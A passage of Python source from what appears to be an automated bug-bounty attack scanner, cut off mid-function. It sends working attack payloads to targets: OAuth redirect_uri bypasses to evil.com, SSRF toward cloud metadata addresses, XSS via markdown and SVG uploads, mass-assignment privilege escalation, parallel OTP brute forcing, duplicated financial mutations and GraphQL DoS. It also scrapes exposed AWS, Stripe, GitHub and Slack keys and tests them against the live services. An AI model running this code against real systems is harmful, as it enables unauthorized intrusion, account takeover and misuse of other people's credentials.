                depth = 10
                nested = "{ __typename " + "{ __typename " * depth + "}" * depth + "}"
                r2 = _S.post(url, json={"query": nested}, timeout=_TIMEOUT)
                if r2.status_code == 200:
                    # Try deeper
                    depth = 50
                    nested = "{ __typename " + "{ __typename " * depth + "}" * depth + "}"
                    r3 = _S.post(url, json={"query": nested}, timeout=_TIMEOUT)
                    if r3.status_code == 200:
                        findings.append({
                            "type": "GraphQL Deep Nesting DoS (No Depth Limit)",
                            "severity": "medium",
                            "url": url,
                            "detail": f"Accepts queries nested {depth}+ levels deep. CPU exhaustion possible.",
                            "template": "apex-graphql-dos-depth",
                        })

                # Test 2: Alias amplification
                aliases = " ".join(f"a{i}: __typename" for i in range(1000))
                r4 = _S.post(url, json={"query": f"{{ {aliases} }}"}, timeout=_TIMEOUT)
                if r4.status_code == 200:
                    try:
                        data = r4.json()
                        if len(data.get("data", {})) >= 1000:
                            findings.append({
                                "type": "GraphQL Alias Amplification (1000x)",
                                "severity": "medium",
                                "url": url,
                                "detail": "Accepts 1000+ aliases in single query. Amplification attack possible.",
                                "template": "apex-graphql-dos-alias",
                            })
                    except Exception:
                        pass
                break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 39 — Double hit rate: deeper crawl + auto-registration + auth scanning
# ---------------------------------------------------------------------------

def crawl_deep(base_url, max_pages=200):
    """Deep crawl — 4x more pages, follows JS links, extracts from JSON APIs.
    The #1 reason scanners miss bugs is insufficient crawl depth."""
    visited = set()
    to_visit = [base_url]
    pages = []
    forms = []
    params_found = defaultdict(set)
    links = set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0].split("#")[0]
        if norm in visited:
            continue
        visited.add(norm)

        try:
            r = _S.get(url, timeout=_TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content)})

        ctype = r.headers.get("content-type", "").lower()

        # JSON API responses — extract all keys as potential params
        if "application/json" in ctype or (r.text.strip()[:1] in ("{", "[")):
            try:
                data = json.loads(r.text)
                _extract_json_params(data, url, params_found, links, depth=0)
            except Exception:
                pass
            continue

        soup = BeautifulSoup(r.text, "lxml")

        # Extract ALL links (a, link, area, base)
        for tag in soup.find_all(["a", "link", "area"], href=True):
            href = tag.get("href", "")
            if not href or href.startswith(("#", "javascript:", "mailto:", "tel:")):
                continue
            full = urllib.parse.urljoin(url, href)
            parsed = urllib.parse.urlparse(full)
            base_parsed = urllib.parse.urlparse(base_url)
            if parsed.netloc and parsed.netloc != base_parsed.netloc:
                continue
            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                for k in urllib.parse.parse_qs(parsed.query):
                    params_found[clean].add(k)
            links.add(full)
            if clean not in visited:
                to_visit.append(full)

        # Extract from ALL script tags (inline + src)
        for script in soup.find_all("script"):
            src = script.get("src")
            if src:
                js_url = src if src.startswith("http") else urllib.parse.urljoin(url, src)
                links.add(js_url)
            js = script.string or ""
            # Extract fetch/axios/XHR URLs
            for m in re.finditer(r"""(?:fetch|axios\.\w+|\.(?:get|post|put|delete|patch))\s*\(\s*[`'"](/?[^`'"]{3,80})[`'"]""", js):
                ep = m.group(1)
                ep_full = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                links.add(ep_full)
                ep_parsed = urllib.parse.urlparse(ep_full)
                if ep_parsed.query:
                    for k in urllib.parse.parse_qs(ep_parsed.query):
                        params_found[ep_full.split("?")[0]].add(k)
                elif "/api/" in ep_full or "/v1/" in ep_full:
                    params_found[ep_full.split("?")[0]]  # Add even without params
                if ep_full.split("?")[0] not in visited:
                    to_visit.append(ep_full)

            # Extract object keys used in API calls (likely params)
            for m in re.finditer(r"""(?:body|data|params)\s*[:=]\s*\{([^}]{5,200})\}""", js):
                for key in re.findall(r"""['"](\w+)['"]""", m.group(1)):
                    # Associate with nearby URL
                    url_match = re.search(r"""['"](/?(?:api|v\d)/[^'"]+)['"]""", js[max(0,m.start()-200):m.start()])
                    if url_match:
                        ep = url_match.group(1)
                        ep_full = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                        params_found[ep_full.split("?")[0]].add(key)

        # Extract forms (deeper — include hidden fields)
        for form in soup.find_all("form"):
            action = form.get("action", url)
            method = form.get("method", "get").upper()
            action_url = urllib.parse.urljoin(url, action)
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs.append({"name": name, "type": inp.get("type", "text"), "value": inp.get("value", "")})
                    params_found[action_url].add(name)
            forms.append({"url": url, "action": action_url, "method": method, "inputs": inputs, "fields": inputs})
            if action_url.split("?")[0] not in visited:
                to_visit.append(action_url)

        # Extract from data attributes
        for tag in soup.find_all(True):
            for attr in ["data-url", "data-href", "data-action", "data-endpoint", "data-api",
                         "action", "formaction", "src", "data-src"]:
                val = tag.get(attr, "")
                if val and ("/" in val or "http" in val) and not val.startswith("#"):
                    full = val if val.startswith("http") else urllib.parse.urljoin(url, val)
                    links.add(full)
                    if full.split("?")[0] not in visited:
                        to_visit.append(full)

    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
    }


def _extract_json_params(data, url, params_found, links, depth=0):
    """Recursively extract params and URLs from JSON responses."""
    if depth > 4:
        return
    base_url = url.split("?")[0]
    if isinstance(data, dict):
        for k, v in data.items():
            params_found[base_url].add(k)
            if isinstance(v, str) and (v.startswith("http") or v.startswith("/")):
                full = v if v.startswith("http") else urllib.parse.urljoin(url, v)
                links.add(full)
            elif isinstance(v, (dict, list)):
                _extract_json_params(v, url, params_found, links, depth + 1)
    elif isinstance(data, list):
        for item in data[:10]:
            _extract_json_params(item, url, params_found, links, depth + 1)


def auto_register_account(base_url):
    """Auto-register a test account to enable authenticated scanning.
    Returns session/token if successful."""
    import random, string

    rand = ''.join(random.choices(string.ascii_lowercase, k=6))
    email = f"apextest_{rand}@protonmail.com"
    password = f"ApexTest_{rand}!2024"
    username = f"apextest_{rand}"

    reg_endpoints = [
        "/api/register", "/api/signup", "/api/users", "/register",
        "/signup", "/api/auth/register", "/api/v1/register",
        "/api/v1/users", "/auth/register",
    ]

    for path in reg_endpoints:
        url = f"{base_url.rstrip('/')}{path}"
        payloads = [
            {"email": email, "password": password, "username": username, "name": "Apex Test"},
            {"email": email, "password": password, "password_confirmation": password, "name": username},
            {"email": email, "password": password},
            {"username": username, "password": password, "email": email},
        ]
        for payload in payloads:
            try:
                r = _S.post(url, json=payload, timeout=_TIMEOUT)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        token = (data.get("token") or data.get("access_token") or
                                 data.get("jwt") or data.get("data", {}).get("token"))
                        if token:
                            return {"token": token, "email": email, "password": password, "type": "bearer"}
                    except Exception:
                        pass
                    # Check cookies for session
                    if r.cookies:
                        return {"cookies": dict(r.cookies), "email": email, "password": password, "type": "cookie"}
            except Exception:
                continue

    # Try login with common test accounts
    login_endpoints = ["/api/login", "/api/auth/login", "/login", "/api/auth"]
    test_creds = [
        ("test@test.com", "test123"), ("demo@demo.com", "demo123"),
        ("user@test.com", "password"), ("guest@guest.com", "guest"),
    ]
    for path in login_endpoints:
        url = f"{base_url.rstrip('/')}{path}"
        for email, pwd in test_creds:
            try:
                r = _S.post(url, json={"email": email, "password": pwd}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        token = data.get("token") or data.get("access_token")
                        if token:
                            return {"token": token, "email": email, "password": pwd, "type": "bearer"}
                    except Exception:
                        pass
                    if r.cookies:
                        return {"cookies": dict(r.cookies), "email": email, "password": pwd, "type": "cookie"}
            except Exception:
                continue
    return None


def crawl_authenticated(base_url, auth_data, max_pages=150):
    """Crawl with authentication — discovers endpoints only visible to logged-in users."""
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": _USER_AGENTS[0]})

    if auth_data.get("type") == "bearer":
        session.headers["Authorization"] = f"Bearer {auth_data['token']}"
    elif auth_data.get("type") == "cookie":
        session.cookies.update(auth_data["cookies"])

    visited = set()
    to_visit = [base_url]
    pages = []
    forms = []
    params_found = defaultdict(set)

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0]
        if norm in visited:
            continue
        visited.add(norm)

        try:
            r = session.get(url, timeout=_TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        if r.status_code in (401, 403):
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content)})

        # Parse response for links and params (same as deep crawl)
        ctype = r.headers.get("content-type", "").lower()
        if "json" in ctype:
            try:
                data = json.loads(r.text)
                _extract_json_params(data, url, params_found, set(), depth=0)
            except Exception:
                pass
            continue

        try:
            soup = BeautifulSoup(r.text, "lxml")
            for tag in soup.find_all("a", href=True):
                href = tag["href"]
                full = urllib.parse.urljoin(url, href)
                parsed = urllib.parse.urlparse(full)
                base_parsed = urllib.parse.urlparse(base_url)
                if parsed.netloc == base_parsed.netloc:
                    clean = full.split("?")[0]
                    if parsed.query:
                        for k in urllib.parse.parse_qs(parsed.query):
                            params_found[clean].add(k)
                    if clean not in visited:
                        to_visit.append(full)

            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action", url))
                inputs = [{"name": i.get("name"), "type": i.get("type", "text"), "value": i.get("value", "")}
                          for i in form.find_all(["input", "textarea", "select"]) if i.get("name")]
                forms.append({"url": url, "action": action, "method": form.get("method", "GET").upper(),
                              "inputs": inputs, "fields": inputs})
                for i in inputs:
                    params_found[action].add(i["name"])
        except Exception:
            continue

    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "auth_data": auth_data,
    }


# ---------------------------------------------------------------------------
# Batch 40 — Todo items #1-#10: Highest bounty value attacks
# ---------------------------------------------------------------------------

def scan_oauth2_full_exploit(crawl_data, web_targets):
    """Full OAuth2 flow exploitation — authorization code interception, PKCE bypass,
    token leakage via referrer, redirect_uri manipulation. (#2)"""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")

        # Find OAuth endpoints
        oauth_paths = ["/oauth/authorize", "/auth/authorize", "/oauth2/authorize",
                       "/connect/authorize", "/.well-known/openid-configuration"]
        for path in oauth_paths:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
                if r.status_code not in (200, 302, 400):
                    continue

                # Test 1: redirect_uri manipulation
                evil_redirects = [
                    "https://evil.com",
                    f"https://{urllib.parse.urlparse(target).hostname}.evil.com",
                    f"{base}/callback/../../../evil.com",
                    f"{base}@evil.com",
                    f"{base}%40evil.com",
                ]
                for evil in evil_redirects:
                    test_url = f"{url}?response_type=code&client_id=test&redirect_uri={urllib.parse.quote(evil)}"
                    r2 = _S.get(test_url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
                    loc = r2.headers.get("Location", "")
                    if "evil.com" in loc or r2.status_code == 302:
                        if "error" not in loc.lower():
                            findings.append({
                                "type": "OAuth2 redirect_uri Bypass → Token Theft",
                                "severity": "critical",
                                "url": test_url,
                                "detail": f"OAuth accepts redirect_uri={evil}. Authorization code sent to attacker.",
                                "template": "apex-oauth-redirect-bypass",
                            })
                            break

                # Test 2: Token in referrer (response_type=token in URL)
                token_url = f"{url}?response_type=token&client_id=test&redirect_uri={base}/callback"
                r3 = _S.get(token_url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
                if r3.status_code in (302, 200) and "access_token" in r3.headers.get("Location", ""):
                    findings.append({
                        "type": "OAuth2 Implicit Flow — Token in URL (Referrer Leak)",
                        "severity": "high",
                        "url": token_url,
                        "detail": "Implicit flow returns token in URL fragment — leaks via Referer header to third parties",
                        "template": "apex-oauth-implicit-leak",
                    })
                break
            except Exception:
                continue
    return findings


def scan_graphql_batch_mutation(crawl_data):
    """GraphQL batch mutation exploitation — duplicate financial operations. (#3)"""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)

        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                r = _S.post(url, json={"query": "{ __typename }"}, timeout=_TIMEOUT_SHORT)
                if r.status_code != 200:
                    continue

                # Find mutation names via introspection
                intro = {"query": "{ __schema { mutationType { fields { name } } } }"}
                r2 = _S.post(url, json=intro, timeout=_TIMEOUT)
                if r2.status_code != 200:
                    continue

                mutations = []
                try:
                    fields = r2.json().get("data", {}).get("__schema", {}).get("mutationType", {}).get("fields", [])
                    mutations = [f["name"] for f in fields]
                except Exception:
                    continue

                # Find financial mutations
                financial = [m for m in mutations if any(x in m.lower() for x in
                             ["transfer", "send", "pay", "withdraw", "redeem", "purchase",
                              "buy", "order", "credit", "debit", "charge"])]

                if financial:
                    # Test batch execution
                    batch = [{"query": f"mutation {{ {financial[0]}(amount: 1) {{ id }} }}"} for _ in range(10)]
                    r3 = _S.post(url, json=batch, timeout=_TIMEOUT)
                    if r3.status_code == 200:
                        try:
                            resp = r3.json()
                            if isinstance(resp, list) and len(resp) >= 10:
                                findings.append({
                                    "type": "GraphQL Batch Mutation — Financial Operation Duplication",
                                    "severity": "critical",
                                    "url": url,
                                    "detail": f"Mutations {financial[:3]} can be batched. 10 operations in 1 request = bypass rate limits on financial actions.",
                                    "template": "apex-graphql-batch-financial",
                                })
                        except Exception:
                            pass
                break
            except Exception:
                continue
    return findings


def scan_pdf_ssrf(crawl_data, web_targets, oob_server=None):
    """PDF generation SSRF — inject URLs in fields that get rendered to PDF. (#4)"""
    findings = []
    oob = oob_server.domain if oob_server and hasattr(oob_server, "domain") else None
    uid = f"pdf_{int(time.time())}"

    # Payloads that trigger fetches in PDF generators (wkhtmltopdf, puppeteer, etc.)
    pdf_payloads = [
        f'<iframe src="http://{oob}/{uid}"></iframe>' if oob else '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>',
        f'<img src="http://{oob}/{uid}">' if oob else '<img src="http://169.254.169.254/">',
        f'<link rel="stylesheet" href="http://{oob}/{uid}"/>' if oob else '',
        '<script>document.location="http://169.254.169.254/"</script>',
    ]

    # Find PDF generation endpoints
    pdf_endpoints = []
    for url in list(crawl_data.get("params", {}).keys())[:30]:
        if any(x in url.lower() for x in ["pdf", "export", "print", "report", "invoice",
                                            "receipt", "download", "generate", "render"]):
            pdf_endpoints.append(url)

    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/export/pdf", "/api/generate-pdf", "/api/invoice",
                     "/api/report/download", "/export", "/print"]:
            pdf_endpoints.append(f"{base}{path}")

    for url in list(set(pdf_endpoints))[:10]:
        params = crawl_data.get("params", {}).get(url, [])
        for payload in pdf_payloads[:2]:
            if not payload:
                continue
            # Try as query param
            for p in (params or ["html", "content", "body", "data", "text"]):
                try:
                    r = _S.post(url, json={p: payload}, timeout=15)
                    if r.status_code == 200 and (b"%PDF" in r.content[:10] or "pdf" in r.headers.get("content-type", "")):
                        findings.append({
                            "type": "PDF Generation SSRF",
                            "severity": "critical",
                            "url": url,
                            "detail": f"PDF endpoint renders HTML with external fetches. Injected via field '{p}'. Internal resources accessible.",
                            "template": "apex-pdf-ssrf",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_markdown_xss(crawl_data):
    """Markdown injection → XSS in rendered markdown. (#5)"""
    findings = []
    md_payloads = [
        "[XSS](javascript:alert(1))",
        "![img](x onerror=alert(1))",
        "[a](<javascript:alert(1)>)",
        "```\n<img src=x onerror=alert(1)>\n```",
        "[XSS](data:text/html,<script>alert(1)</script>)",
        "<details open ontoggle=alert(1)>",
    ]

    # Find markdown-accepting endpoints (comments, descriptions, bios, wikis)
    md_fields = ["body", "content", "description", "comment", "message", "bio",
                 "text", "markdown", "note", "readme", "wiki"]

    for form in crawl_data.get("forms", [])[:15]:
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        target_fields = [i for i in inputs if any(x in i.get("name", "").lower() for x in md_fields)]
        if not target_fields:
            continue

        for field in target_fields:
            for payload in md_payloads[:3]:
                data = {i.get("name", "x"): i.get("value", "test") for i in inputs if i.get("name")}
                data[field["name"]] = payload
                try:
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 302):
                        # Check if XSS payload rendered
                        if "javascript:alert" in r.text or "onerror=alert" in r.text:
                            findings.append({
                                "type": "Markdown Injection → XSS",
                                "severity": "high",
                                "url": action,
                                "detail": f"Markdown XSS via field '{field['name']}': {payload[:50]}",
                                "template": "apex-markdown-xss",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_password_reset_prediction(crawl_data, web_targets):
    """Password reset token prediction via timestamp analysis. (#9)"""
    findings = []
    import hashlib

    for target in web_targets[:3]:
        base = target.rstrip("/")
        reset_endpoints = ["/api/forgot-password", "/api/password/reset",
                           "/forgot-password", "/api/auth/forgot"]

        for path in reset_endpoints:
            url = f"{base}{path}"
            tokens = []
            try:
                # Request multiple reset tokens rapidly
                for _ in range(5):
                    r = _S.post(url, json={"email": "test@test.com"}, timeout=_TIMEOUT)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            token = data.get("token") or data.get("reset_token") or data.get("code")
                            if token:
                                tokens.append(token)
                        except Exception:
                            pass
                    time.sleep(0.1)

                if len(tokens) >= 3:
                    # Analyze token patterns
                    # Check if tokens are sequential
                    if all(t.isdigit() for t in tokens):
                        nums = [int(t) for t in tokens]
                        diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                        if max(diffs) - min(diffs) < 10:
                            findings.append({
                                "type": "Predictable Password Reset Token (Sequential)",
                                "severity": "critical",
                                "url": url,
                                "detail": f"Reset tokens are sequential: {tokens[:3]}. Next token predictable.",
                                "template": "apex-reset-token-predict",
                            })

                    # Check if tokens share common prefix (timestamp-based)
                    prefix = os.path.commonprefix(tokens)
                    if len(prefix) > len(tokens[0]) * 0.4:
                        findings.append({
                            "type": "Predictable Password Reset Token (Timestamp-Based)",
                            "severity": "high",
                            "url": url,
                            "detail": f"Reset tokens share {len(prefix)}/{len(tokens[0])} char prefix. Likely timestamp-based.",
                            "template": "apex-reset-token-timestamp",
                        })
            except Exception:
                continue
    return findings


def scan_api_key_scope(crawl_data, web_targets):
    """API key scope testing — verify what each discovered key can access. (#10)"""
    findings = []

    # Collect all API keys found in previous scans
    api_keys = []
    for v in crawl_data.get("pages", []):
        url = v.get("url", "")
        try:
            r = _S.get(url, timeout=_TIMEOUT_SHORT)
            # Find API keys in response
            for pattern, name in [
                (re.compile(r'AKIA[0-9A-Z]{16}'), "AWS"),
                (re.compile(r'sk_live_[0-9a-zA-Z]{24,}'), "Stripe"),
                (re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,}'), "GitHub"),
                (re.compile(r'AIza[0-9A-Za-z\-_]{35}'), "Google"),
                (re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'), "Slack"),
            ]:
                for match in pattern.finditer(r.text):
                    api_keys.append({"key": match.group(), "type": name, "source": url})
        except Exception:
            continue

    # Test each key's scope
    for key_info in api_keys[:5]:
        key = key_info["key"]
        key_type = key_info["type"]

        if key_type == "Stripe":
            try:
                # Test what Stripe key can do
                for endpoint, desc in [
                    ("https://api.stripe.com/v1/charges?limit=1", "read charges"),
                    ("https://api.stripe.com/v1/customers?limit=1", "read customers"),
                    ("https://api.stripe.com/v1/balance", "read balance"),
                ]:
                    r = requests.get(endpoint, auth=(key, ""), timeout=5)
                    if r.status_code == 200:
                        findings.append({
                            "type": f"Stripe Key Active — Can {desc}",
                            "severity": "critical",
                            "url": key_info["source"],
                            "detail": f"Key {key[:15]}... has access to {desc}. Full payment data exposed.",
                            "template": "apex-apikey-stripe",
                        })
                        break
            except Exception:
                pass

        elif key_type == "GitHub":
            try:
                r = requests.get("https://api.github.com/user",
                                 headers={"Authorization": f"token {key}"}, timeout=5)
                if r.status_code == 200:
                    user = r.json().get("login", "?")
                    # Check scopes
                    scopes = r.headers.get("X-OAuth-Scopes", "none")
                    findings.append({
                        "type": f"GitHub Token Active — User: {user}",
                        "severity": "critical",
                        "url": key_info["source"],
                        "detail": f"Token for '{user}' with scopes: {scopes}",
                        "template": "apex-apikey-github",
                    })
            except Exception:
                pass

        elif key_type == "Slack":
            try:
                r = requests.get("https://slack.com/api/auth.test",
                                 headers={"Authorization": f"Bearer {key}"}, timeout=5)
                if r.status_code == 200 and r.json().get("ok"):
                    team = r.json().get("team", "?")
                    findings.append({
                        "type": f"Slack Token Active — Workspace: {team}",
                        "severity": "high",
                        "url": key_info["source"],
                        "detail": f"Slack token valid for workspace '{team}'. Can read messages, channels.",
                        "template": "apex-apikey-slack",
                    })
            except Exception:
                pass
    return findings


# ---------------------------------------------------------------------------
# Batch 41 — Todo items #6-#30
# ---------------------------------------------------------------------------

def scan_cswsh(web_targets):
    """Cross-Site WebSocket Hijacking — steal WS data cross-origin. (#6)"""
    findings = []
    try:
        import websocket as ws
    except ImportError:
        return findings

    for target in web_targets[:5]:
        parsed = urllib.parse.urlparse(target)
        ws_base = f"wss://{parsed.netloc}" if parsed.scheme == "https" else f"ws://{parsed.netloc}"
        for path in ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket", "/cable", "/realtime"]:
            try:
                conn = ws.create_connection(f"{ws_base}{path}", timeout=5,
                                            sslopt={"cert_reqs": 0},
                                            origin="https://evil.com",
                                            header=["Cookie: session=test"])
                # If connection succeeds from evil origin, CSWSH is possible
                conn.send('{"type":"ping"}')
                try:
                    resp = conn.recv()
                    findings.append({
                        "type": "Cross-Site WebSocket Hijacking (CSWSH)",
                        "severity": "high",
                        "url": f"{ws_base}{path}",
                        "detail": f"WebSocket accepts cross-origin connections with cookies. Attacker page can hijack authenticated WS session.",
                        "template": "apex-cswsh",
                    })
                except Exception:
                    pass
                conn.close()
                break
            except Exception:
                continue
    return findings


def scan_svg_xss_upload(crawl_data):
    """SVG upload → XSS chain. (#8)"""
    findings = []
    svg_xss = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script>alert('XSS')</script>
<circle cx="50" cy="50" r="40"/>
</svg>"""

    upload_forms = [f for f in crawl_data.get("forms", [])
                    if any(i.get("type") == "file" for i in f.get("inputs", []))]
    for form in upload_forms[:5]:
        action = form.get("action", "")
        if not action:
            continue
        try:
            files = {"file": ("test.svg", svg_xss, "image/svg+xml")}
            r = _S.post(action, files=files, timeout=_TIMEOUT)
            if r.status_code in (200, 201):
                # Check if SVG is served back with script intact
                if "url" in r.text.lower() or "path" in r.text.lower():
                    url_match = re.search(r'https?://[^\s"\'<>]+\.svg', r.text)
                    if url_match:
                        r2 = _S.get(url_match.group(), timeout=_TIMEOUT_SHORT)
                        if "<script>" in r2.text and "svg" in r2.headers.get("content-type", ""):
                            findings.append({
                                "type": "SVG Upload → XSS",
                                "severity": "high",
                                "url": url_match.group(),
                                "detail": "SVG with embedded JavaScript uploaded and served with SVG content-type. XSS on any user who views it.",
                                "template": "apex-svg-xss-upload",
                            })
        except Exception:
            continue
    return findings


def scan_idor_graphql_node(crawl_data):
    """IDOR via GraphQL node interface — access any object by global ID. (#27)"""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Test node interface
                r = _S.post(url, json={"query": '{ node(id: "1") { id ... on User { email } } }'}, timeout=_TIMEOUT)
                if r.status_code != 200:
                    continue
                data = r.json()
                if data.get("data", {}).get("node"):
                    # Node interface exists — try enumerating
                    for test_id in ["1", "2", "3", "admin", "user_1"]:
                        r2 = _S.post(url, json={"query": f'{{ node(id: "{test_id}") {{ id }} }}'}, timeout=_TIMEOUT_SHORT)
                        if r2.status_code == 200:
                            node_data = r2.json().get("data", {}).get("node")
                            if node_data:
                                findings.append({
                                    "type": "IDOR via GraphQL Node Interface",
                                    "severity": "high",
                                    "url": url,
                                    "detail": f"Node interface exposes objects by ID. Accessed node id={test_id}. Any object enumerable.",
                                    "template": "apex-idor-graphql-node",
                                })
                                break
                break
            except Exception:
                continue
    return findings


def scan_mass_assignment_patch(crawl_data, web_targets):
    """Mass assignment via PATCH with all model fields. (#28)"""
    findings = []
    priv_fields = {"role": "admin", "is_admin": True, "admin": True, "verified": True,
                   "email_verified": True, "active": True, "balance": 99999,
                   "credits": 99999, "plan": "enterprise", "permissions": ["*"]}

    for target in web_targets[:5]:
        base = target.rstrip("/")
        for path in ["/api/user", "/api/me", "/api/profile", "/api/account"]:
            url = f"{base}{path}"
            try:
                # Try PATCH with privilege fields
                r = _S.patch(url, json=priv_fields, timeout=_TIMEOUT)
                if r.status_code in (200, 204):
                    resp_text = r.text.lower()
                    if any(x in resp_text for x in ["admin", "enterprise", "99999", "verified"]):
                        findings.append({
                            "type": "Mass Assignment → Privilege Escalation (PATCH)",
                            "severity": "critical",
                            "url": url,
                            "detail": f"PATCH accepts privilege fields: role, is_admin, balance, plan. Instant admin/credit manipulation.",
                            "template": "apex-mass-assign-patch",
                        })
                        break
            except Exception:
                continue
    return findings


def scan_race_2fa(crawl_data, web_targets):
    """Race condition in 2FA verification — brute force OTP in parallel. (#29)"""
    findings = []
    from concurrent.futures import ThreadPoolExecutor, as_completed

    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/verify-otp", "/api/2fa/verify", "/api/auth/otp", "/verify-2fa"]:
            url = f"{base}{path}"
            try:
                # Send 20 different OTPs simultaneously
                otps = [f"{i:06d}" for i in range(20)]
                results = []

                def _try_otp(otp):
                    try:
                        return _S.post(url, json={"otp": otp, "code": otp}, timeout=_TIMEOUT_SHORT)
                    except Exception:
                        return None

                with ThreadPoolExecutor(max_workers=20) as pool:
                    futs = [pool.submit(_try_otp, otp) for otp in otps]
                    for f in as_completed(futs):
                        r = f.result()
                        if r and r.status_code in (200, 401, 400, 429):
                            results.append(r.status_code)

                # If all 20 got through without rate limiting
                if len(results) >= 18 and 429 not in results:
                    findings.append({
                        "type": "2FA Race Condition — OTP Brute Force",
                        "severity": "critical",
                        "url": url,
                        "detail": f"20 parallel OTP attempts accepted without rate limit. 6-digit OTP crackable in ~50 requests.",
                        "template": "apex-race-2fa",
                    })
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 42 — Todo items #50, #51, #76, #83, #84, #85, #86, #89, #90, #96
# ---------------------------------------------------------------------------

def scan_git_exposure(web_targets):
    """Git repository exposure — download .git and extract secrets. (#50)"""
    findings = []
    git_paths = ["/.git/config", "/.git/HEAD", "/.git/index", "/.git/logs/HEAD"]
    for target in web_targets[:8]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in git_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200:
                if "[core]" in r.text or "ref:" in r.text or b"DIRC" in r.content[:4]:
                    findings.append({
                        "type": "Git Repository Exposed",
                        "severity": "critical",
                        "url": url,
                        "detail": "Full .git directory accessible. Source code, secrets, and commit history downloadable.",
                        "template": "apex-git-exposed",
                    })
                    break
    return findings


def scan_env_leak(web_targets):
    """Environment variable leakage via error pages and debug endpoints. (#51)"""
    findings = []
    env_paths = ["/.env", "/env", "/.env.local", "/.env.production", "/.env.backup",
                 "/api/env", "/debug/env", "/config/env", "/server-info"]
    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in env_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200 and len(r.text) > 20:
                if any(x in r.text for x in ["DB_PASSWORD", "SECRET_KEY", "API_KEY",
                                              "AWS_", "DATABASE_URL", "REDIS_URL",
                                              "MAIL_PASSWORD", "JWT_SECRET"]):
                    findings.append({
                        "type": "Environment Variables Exposed",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Env file with secrets accessible. Contains database credentials, API keys.",
                        "template": "apex-env-leak",
                    })
                    break
    return findings


def scan_firebase_misconfig_deep(web_targets):
    """Firebase database rule misconfiguration — read/write without auth. (#76)"""
    findings = []
    for target in web_targets[:5]:
        # Extract Firebase project from page source
        try:
            r = _S.get(target, timeout=_TIMEOUT_SHORT)
            fb_match = re.search(r'https://([a-z0-9-]+)\.firebaseio\.com', r.text)
            if not fb_match:
                fb_match = re.search(r'"projectId":\s*"([^"]+)"', r.text)
            if not fb_match:
                continue
            project = fb_match.group(1)
            fb_url = f"https://{project}.firebaseio.com/.json"
            r2 = requests.get(fb_url, timeout=5)
            if r2.status_code == 200 and r2.text != "null":
                findings.append({
                    "type": "Firebase Database — Public Read Access",
                    "severity": "critical",
                    "url": fb_url,
                    "detail": f"Firebase project '{project}' allows unauthenticated read. All data exposed.",
                    "template": "apex-firebase-public",
                })
        except Exception:
            continue
    return findings


def scan_terraform_state(web_targets):
    """Terraform state file exposure — contains all infrastructure secrets. (#83)"""
    findings = []
    tf_paths = ["/terraform.tfstate", "/.terraform/terraform.tfstate",
                "/tfstate", "/state.tf", "/terraform.tfstate.backup"]
    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{p}" for p in tf_paths]
        for url, r in batch_get(urls, timeout=5):
            if r and r.status_code == 200:
                if '"terraform_version"' in r.text or '"resources"' in r.text:
                    findings.append({
                        "type": "Terraform State File Exposed",
                        "severity": "critical",
                        "url": url,
                        "detail": "Terraform state contains all infrastructure secrets (DB passwords, API keys, private keys).",
                        "template": "apex-terraform-state",
                    })
                    break
    return findings


def scan_docker_registry(web_targets):
    """Docker registry API exploitation — pull images without auth. (#84)"""
    findings = []
    for target in web_targets[:5]:
        base = target.rstrip("/")
        try:
